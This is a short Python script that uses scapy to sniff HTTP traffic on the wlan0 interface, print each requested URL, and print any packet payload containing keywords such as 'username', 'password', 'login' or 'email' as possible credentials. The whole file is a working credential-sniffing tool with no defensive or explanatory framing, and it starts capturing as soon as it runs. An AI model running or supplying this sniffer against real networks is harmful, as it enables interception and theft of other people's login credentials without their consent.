#/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


keywords = ["username", "password", "login", "email", "user", "pass"]


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        load = str(load)
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("HTTP Req: " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print("\nPossible username/password: " + login_info + "\n")



sniff("wlan0")

